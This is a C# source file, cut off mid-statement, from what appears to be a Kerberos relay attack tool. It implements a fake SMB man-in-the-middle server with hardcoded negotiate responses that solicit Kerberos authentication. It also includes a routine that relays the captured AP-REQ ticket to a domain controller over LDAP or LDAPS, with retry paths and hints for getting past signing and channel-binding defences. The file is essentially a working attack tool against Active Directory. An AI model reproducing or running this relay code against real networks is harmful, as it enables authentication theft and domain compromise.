
using KrbRelay.Clients;
using KrbRelay;
using SMBLibrary.Client;
using SMBLibrary;
using System.Collections.Concurrent;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Threading.Tasks;
using System;
using static System.Runtime.InteropServices.JavaScript.JSType;

public class State
{
    public Socket SourceSocket { get; }
    public Socket TargetSocket { get; }
    public byte[] Buffer { get; }
    public int numReads = 0;

    public bool isRelayed = false;
    public string ServerType = "";
    public State(Socket sourceSocket, Socket targetSocket)
    {
        SourceSocket = sourceSocket;
        TargetSocket = targetSocket;
        Buffer = new byte[4096]; // Adjust buffer size as needed
    }

}
class SMBCommandSocketConsole
{

    public byte[] apreqBuffer;
    public FakeSMBServer currSocketServer;
    public async Task Start(int port, State state, byte[] buffer)
    {
        // Define the IP address and port


        apreqBuffer = buffer;
        // Create a TcpListener
        TcpListener listener = new TcpListener(IPAddress.Any, port);

        try
        {
            // Start the listener
            listener.Start();
            Console.WriteLine("[*] SMB Console Server started on [any:{0}]. Waiting for connections...", port);

            //while (true)
            {
                // Accept a client socket
                //Socket clientSocket = listener.AcceptTcpClientAsync(); // AcceptSocket(); //AcceptTcpClientAsync()
                TcpClient clientSocket = await listener.AcceptTcpClientAsync();


                Console.WriteLine("[*] SMB Console Server connected client: [{0}]", clientSocket.Client.RemoteEndPoint);
                SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                //smbc.curSocketServer =  currSocketServer;
                KrbRelay.Clients.Smb smb2 = new Smb(clientSocket.Client);
                //smbc.currSourceSocket = state.SourceSocket;
                //smbc.currDestSocket = state.TargetSocket;
                //smbc.ServerType = State.ServerType;
                //smbc.curSocketServer = currSocketServer;
                bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                if (!isConnected)
                {
                    Console.WriteLine("[-] Could not connect to [{0}:445]", Program.targetFQDN);

                }



                Console.WriteLine("[*] SMB relay Connected to: [{0}:445]", Program.targetFQDN);
                //state.isRelayed = true;
                //Task.Run(() => smb2.smbConnect(smbc));
                Task.Run(() => smb2.smbConnect(smbc, buffer));


                // Handle the client connection

            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
        finally
        {
            listener.Stop();
        }
    }
}
public class FakeSMBServer
{
    private Socket _listenerSocket;
    private IPEndPoint _targetEndpoint;
    private ConcurrentDictionary<string, State> _activeConnections = new ConcurrentDictionary<string, State>();

    private int _listenPort;
    private string _targetHost;
    private int _targetPort;
    private bool _isRunning = false;
    public bool ForwardOnly = false;
    public string ServerType = "";
    public State state;

    byte[] smbNegotiateProtocolResponse = new byte[] { 0x0, 0x00, 0x00, 0xf8, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0xff,0x02,0x00,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x07,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0x00,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65};
    byte[] dummysmb = new byte[]
    {
           0x00 ,0x00 ,0x00 ,0xf8 ,0xfe ,0x53 ,0x4d ,0x42 ,0x40 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00  ,
  0x00 ,0x00 ,0x01 ,0x00 ,0x01 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00  ,
  0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00  ,
  0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00  ,
  0x00 ,0x00 ,0x00 ,0x00 ,0x41 ,0x00 ,0x01 ,0x00 ,0xff ,0x02 ,0x00 ,0x00 ,0xc8 ,0x97 ,0x05 ,0x2d  ,
  0x4e ,0x3a ,0x86 ,0x41 ,0xba ,0xe0 ,0x25 ,0xfb ,0xcd ,0x3e ,0x2a ,0xa1 ,0x07 ,0x00 ,0x00 ,0x00  ,
  0x00 ,0x00 ,0x80 ,0x00 ,0x00 ,0x00 ,0x80 ,0x00 ,0x00 ,0x00 ,0x80 ,0x00 ,0xfc ,0xe7 ,0x5d ,0xeb  ,
  0xa0 ,0x2c ,0xdc ,0x01 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x80 ,0x00 ,0x78 ,0x00  ,
  0x00 ,0x00 ,0x00 ,0x00 ,0x60 ,0x76 ,0x06 ,0x06 ,0x2b ,0x06 ,0x01 ,0x05 ,0x05 ,0x02 ,0xa0 ,0x6c  ,
  0x30 ,0x6a ,0xa0 ,0x3c ,0x30 ,0x3a ,0x06 ,0x0a ,0x2b ,0x06 ,0x01 ,0x04 ,0x01 ,0x82 ,0x37 ,0x02  ,
  0x02 ,0x1e ,0x06 ,0x09 ,0x2a ,0x86 ,0x48 ,0x82 ,0xf7 ,0x12 ,0x01 ,0x02 ,0x02 ,0x06 ,0x09 ,0x2a  ,
  0x86 ,0x48 ,0x86 ,0xf7 ,0x12 ,0x01 ,0x02 ,0x02 ,0x06 ,0x0a ,0x2a ,0x86 ,0x48 ,0x86 ,0xf7 ,0x12  ,
  0x01 ,0x02 ,0x02 ,0x03 ,0x06 ,0x0a ,0x2b ,0x06 ,0x01 ,0x04 ,0x01 ,0x82 ,0x37 ,0x02 ,0x02 ,0x0a  ,
  0xa3 ,0x2a ,0x30 ,0x28 ,0xa0 ,0x26 ,0x1b ,0x24 ,0x6e ,0x6f ,0x74 ,0x5f ,0x64 ,0x65 ,0x66 ,0x69  ,
  0x6e ,0x65 ,0x64 ,0x5f ,0x69 ,0x6e ,0x5f ,0x52 ,0x46 ,0x43 ,0x34 ,0x31 ,0x37 ,0x38 ,0x40 ,0x70  ,
  0x6c ,0x65 ,0x61 ,0x73 ,0x65 ,0x5f ,0x69 ,0x67 ,0x6e ,0x6f ,0x72 ,0x65
    };

    byte[] smb2NegotiateProtocolResponse = new byte[] {0x00,0x00,0x01,0x34,0xfe,0x53,0x4d,0x42,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0x11,0x03,0x02,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x2f,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0xf8,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65,0x01,0x00,0x26,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x01,0x00,0x29,0xa6,0x59,0xda,0xea,0xa7,
                                                                0x13,0x09,0x93,0x27,0xdb,0x6e,0x41,0xee,0xf8,0x14,0x45,0x6e,0xdb,0xfa,0x09,0x8c,
                                                                0x14,0x87,0xf9,0x4c,0x14,0x73,0xca,0xbd,0xe5,0x20,0x00,0x00,0x02,0x00,0x04,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x02,0x00};
    byte[] smb3NegotiateProtocolResponse = new byte[] {0x00, 0x00, 0x01, 0x74, 0xFE, 0x53, 0x4D, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00,
        0x01, 0x00, 0x11, 0x03, 0x05, 0x00, 0x93, 0x6D, 0x4F, 0xE8, 0xB6, 0xD9, 0x23, 0x4A, 0xB5, 0x33, 0x05, 0x98, 0x82, 0xA8, 0xE3, 0xAE, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0xED, 0x25, 0x57, 0x35, 0x15, 0x40, 0xDB, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00,
        0x78, 0x00, 0xF8, 0x00, 0x00, 0x00, 0x60, 0x76, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x6C, 0x30, 0x6A, 0xA0, 0x3C, 0x30, 0x3A, 0x06, 0x0A, 0x2B, 0x06,
        0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01,
        0x02, 0x02, 0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x03, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, 0xA3, 0x2A,
        0x30, 0x28, 0xA0, 0x26, 0x1B, 0x24, 0x6E, 0x6F, 0x74, 0x5F, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x64, 0x5F, 0x69, 0x6E, 0x5F, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
        0x40, 0x70, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5F, 0x69, 0x67, 0x6E, 0x6F, 0x72, 0x65, 0x01, 0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x01, 0x00,
        0x72, 0x84, 0xBE, 0xA6, 0x02, 0x97, 0x90, 0xA5, 0xBA, 0x06, 0xCB, 0xF0, 0xF3, 0x7E, 0xFD, 0x60, 0x01, 0x21, 0x66, 0xB8, 0x88, 0x25, 0xE9, 0x55, 0xB0, 0xBD, 0x2C, 0x4A,
        0x2C, 0x95, 0x52, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x04, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
        0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00};
    byte[] smb3NegotiateKerbProtocolResponse = new byte[] {0x00, 0x00, 0x01, 0x74, 0xFE, 0x53, 0x4D, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00,
     0x01, 0x00, 0x11, 0x03, 0x05, 0x00, 0x93, 0x6D, 0x4F, 0xE8, 0xB6, 0xD9, 0x23, 0x4A, 0xB5, 0x33, 0x05, 0x98, 0x82, 0xA8, 0xE3, 0xAE, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0xED, 0x25, 0x57, 0x35, 0x15, 0x40, 0xDB, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00,
     0x78, 0x00, 0xF8, 0x00, 0x00, 0x00, 0x60, 0x76, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x6C, 0x30, 0x6A, 0xA0, 0x3C, 0x30, 0x3A, 0x06, 0x0A, 0x2B, 0x06,
     0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01,
     0x02, 0x02, 0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x03, 0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, 0x03,0xA3, 0x2A,
     0x30, 0x28, 0xA0, 0x26, 0x1B, 0x24, 0x6E, 0x6F, 0x74, 0x5F, 0x64, 0x65, 0x66, 0x69, 0x6E, 0x65, 0x64, 0x5F, 0x69, 0x6E, 0x5F, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
     0x40, 0x70, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5F, 0x69, 0x67, 0x6E, 0x6F, 0x72, 0x65, 0x01, 0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x01, 0x00,
     0x72, 0x84, 0xBE, 0xA6, 0x02, 0x97, 0x90, 0xA5, 0xBA, 0x06, 0xCB, 0xF0, 0xF3, 0x7E, 0xFD, 0x60, 0x01, 0x21, 0x66, 0xB8, 0x88, 0x25, 0xE9, 0x55, 0xB0, 0xBD, 0x2C, 0x4A,
     0x2C, 0x95, 0x52, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x04, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
     0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00};
    byte[] smb2NegotiateKerberosProtocolResponse = { 0x0, 0x0, 0x0, 0xd4, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x1, 0x0, 0x2, 0x2, 0x0, 0x0, 0x57, 0x50, 0x73, 0x64, 0x50, 0x4d, 0x6a, 0x73, 0x65, 0x4f, 0x5a, 0x62, 0x43, 0x56, 0x64, 0x6a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x80, 0x8d, 0x8c, 0xcc, 0xe, 0xe4, 0xdb, 0x1, 0x80, 0x8d, 0x8c, 0xcc, 0xe, 0xe4, 0xdb, 0x1, 0x80, 0x0, 0x54, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x52, 0x6, 0x6, 0x2b, 0x6, 0x1, 0x5, 0x5, 0x2, 0xa0, 0x48, 0x30, 0x46, 0xa0, 0x18, 0x30, 0x16, 0x6, 0x9, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x1, 0x2, 0x2, 0x6, 0x9, 0x2a, 0x86, 0x48, 0x82, 0xf7, 0x12, 0x1, 0x2, 0x2, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26, 0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31,
        0x37, 0x38, 0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f, 0x72, 0x65 };
    public FakeSMBServer(int listenPort, string targetHost, int targetPort)
    {
        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;

    }
    public FakeSMBServer(int listenPort, string targetHost, int targetPort, string stype)
    {
        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;
        ServerType = stype;

    }
    public void Start(bool fwd)
    {
        ForwardOnly = fwd;
        Console.WriteLine($"[*] Starting MiTMServer on port:[{_listenPort}] {(ForwardOnly ? "(Forward Only mode)" : "")} ");
        _listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, _listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        IPAddress.TryParse(Program.RedirectHost, out IPAddress ipAddress);
        _targetEndpoint = new IPEndPoint(ipAddress, _targetPort);
        _isRunning = true;
        _listenerSocket.BeginAccept(OnClientConnect, null);



    }
    public void Stop()
    {
        if (_isRunning)
        {
            Console.WriteLine("[*] Stopping MiTMServer on port:[{0}]", _listenPort);
            _isRunning = false;

            // Stop listening for new connections
            _listenerSocket.Close();

            // Close all active connections
            foreach (var kvp in _activeConnections)
            {
                CloseConnection(kvp.Value);
            }

            _activeConnections.Clear();

            Console.WriteLine("[*] MiTMServer [{0}] stopped.", _listenPort);
        }
    }

    public void ListConnectedClients()
    {
        Console.WriteLine("\n[*] Connected Clients on port:[{0}]", _listenPort);
        foreach (var key in _activeConnections.Keys)
        {
            Console.WriteLine($"- {key}");
        }
    }

    /// <summary>
    /// Relays the captured AP-REQ to the target domain controller over LDAP (389) or LDAPS (636 with -ssl).
    /// With -reauth a base simple bind with the supplied low privileged account is performed first and the
    /// reflected ticket is then sent as an RFC 4513 re-authentication on that same connection.
    /// </summary>
    private static void RelayToLdap(byte[] apreqBuffer)
    {
        byte[] apreq = apreqBuffer;
        int port = Program.useSSL ? 636 : 389;

        Task.Run(() =>
        {
            using (KrbRelay.Clients.LdapRelayClient ldap = new KrbRelay.Clients.LdapRelayClient())
            {
                ldap.Trace = Program.ldapDebug;
                if (!ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string error))
                {
                    Console.WriteLine("[-] ldap: cannot connect to [{0}:{1}]: {2}", Program.RedirectHost, port, error);
                    return;
                }
                Console.WriteLine("[*] ldap: connected to [{0}:{1}]{2}", Program.RedirectHost, port, Program.useSSL ? " over TLS" : "");

                if (Program.ldapStartTls && !ldap.IsTls)
                {
                    if (!ldap.StartTls(out string startTlsError))
                    {
                        Console.WriteLine("[-] ldap: StartTLS failed: {0}", startTlsError);
                        return;
                    }
                    Console.WriteLine("[+] ldap: StartTLS established, binding over TLS");
                }

                // The captured ticket is only usable against the service it was issued for.
                if (KrbRelay.Clients.KerberosApReq.TryGetServiceName(apreq, out string ticketService, out string ticketRealm))
                {
                    Console.WriteLine("[*] ldap: relayed ticket is for {0}@{1}", ticketService, ticketRealm);
                    string ticketSvc = ticketService.Split('/')[0];
                    if (!ticketSvc.Equals("ldap", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("[!] ldap: ticket service is '{0}', not 'ldap' - the DC will reject it unless that SPN maps to the same account", ticketSvc);
                    }
                }
                else
                {
                    Console.WriteLine("[!] ldap: could not decode the AP-REQ service name ({0} bytes), head={1}",
                        apreq.Length, BitConverter.ToString(apreq, 0, Math.Min(48, apreq.Length)).Replace("-", "").ToLowerInvariant());
                }

                int result;
                string diagnostic;

                if (Program.reauth)
                {
                    result = ldap.BindSimple(Program.reauthDomain, Program.reauthUser, Program.reauthPassword, out diagnostic);

                    // The DC enforces LDAP signing: a simple bind needs integrity on the wire. Retry once
                    // over StartTLS on the same port (or use -ssl for LDAPS 636).
                    if ((result == 8 || result == 53) && !ldap.IsTls)
                    {
                        Console.WriteLine("[*] ldap: signing required on plaintext 389 (strongAuthRequired), negotiating StartTLS");
                        if (ldap.StartTls(out string tlsError))
                        {
                            Console.WriteLine("[+] ldap: StartTLS established, retrying base bind");
                            result = ldap.BindSimple(Program.reauthDomain, Program.reauthUser, Program.reauthPassword, out diagnostic);
                        }
                        else
                        {
                            Console.WriteLine("[-] ldap: StartTLS failed: {0}", tlsError);
                        }
                    }

                    if (result != 0)
                    {
                        Console.WriteLine("[-] ldap: base bind as {0}\\{1} failed: {2} ({3}) {4}",
                            Program.reauthDomain, Program.reauthUser, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
                        if (result == 8 || result == 53)
                        {
                            Console.WriteLine("[-] ldap: this DC requires integrity on the bind, use -ssl (LDAPS 636) or ensure StartTLS is allowed");
                        }
                        return;
                    }
                    Console.WriteLine("[+] ldap: base bind as {0}\\{1} established, sending re-authentication",
                        Program.reauthDomain, Program.reauthUser);

                    result = ldap.BindSaslGssApi(apreq, out diagnostic);
                    Console.WriteLine("[*] ldap: re-authentication ({0}) result: {1} ({2}) {3}",
                        ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);

                    // AD may refuse to switch from a simple bind to a SASL bind in place (Notice of Disconnection).
                    // The base bind has already served its purpose, so retry the ticket bind on a fresh connection.
                    if (result != 0)
                    {
                        Console.WriteLine("[!] ldap: in-place re-authentication refused, retrying the ticket bind on a fresh connection");
                        ldap.Dispose();
                        if (ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string reconnectError))
                        {
                            result = ldap.BindSaslGssApi(apreq, out diagnostic);
                            Console.WriteLine("[*] ldap: relayed bind on a fresh connection ({0}) result: {1} ({2}) {3}",
                                ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
                        }
                        else
                        {
                            Console.WriteLine("[-] ldap: reconnect failed: {0}", reconnectError);
                        }
                    }
                }
                else
                {
                    result = ldap.BindSaslGssApi(apreq, out diagnostic);
                    Console.WriteLine("[*] ldap: relayed bind ({0}) result: {1} ({2}) {3}",
                        ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);

                    // Some DCs only accept the "GSSAPI" SASL mechanism. It expects the GSS-API Kerberos token
                    // (the SPNEGO mechToken, 0x60 ... OID ... AP-REQ), not a bare AP-REQ.
                    if (result != 0 && KrbRelay.Clients.KerberosApReq.TryExtractGssToken(apreq, out byte[] gssToken))
                    {
                        Console.WriteLine("[!] ldap: retrying with the GSS-API Kerberos token (SASL mechanism GSSAPI)");
                        ldap.Dispose();
                        if (ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string retryError))
                        {
                            result = ldap.BindSaslGssApi(gssToken, "GSSAPI", out diagnostic);
                            Console.WriteLine("[*] ldap: GSSAPI bind ({0}) result: {1} ({2}) {3}",
                                ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
                        }
                        else
                        {
                            Console.WriteLine("[-] ldap: reconnect failed: {0}", retryError);
                        }
                    }
                }

                if (result != 0)
                {
                    Console.WriteLine("[-] ldap: bind refused: {0} ({1}) {2}",
                        KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);

                    if (diagnostic.Contains("80090346") || diagnostic.Contains("8009034"))
                    {
                        Console.WriteLine("[-] ldap: channel binding (EPA) mismatch - the DC requires the TLS channel binding");
                        Console.WriteLine("[-] ldap: inside the ticket, which a relayed AP-REQ cannot carry. Retry WITHOUT -ssl/-ldapstarttls.");
                    }
                    else if (diagnostic.Contains("80090308"))
                    {
                        Console.WriteLine("[-] ldap: invalid GSS token for this SASL mechanism");
                    }
                    else if (result == 49)
                    {
                        Console.WriteLine("[-] ldap: the ticket was refused; it must map to the DC's machine account (ldap/<dc>)");
                    }
                    return;
                }

                // Short timeout: if the DC stops answering after the bind there is nothing to wait for.
                ldap.SetReceiveTimeout(5000);

                string who = ldap.WhoAmI(out int whoResult, out string whoDiagnostic);
                if (who != null)
                {
                    Console.WriteLine("[+] ldap: authenticated as {0}", who);
                }
                else
                {
                    Console.WriteLine("[!] ldap: whoami failed: {0} ({1}) {2}",
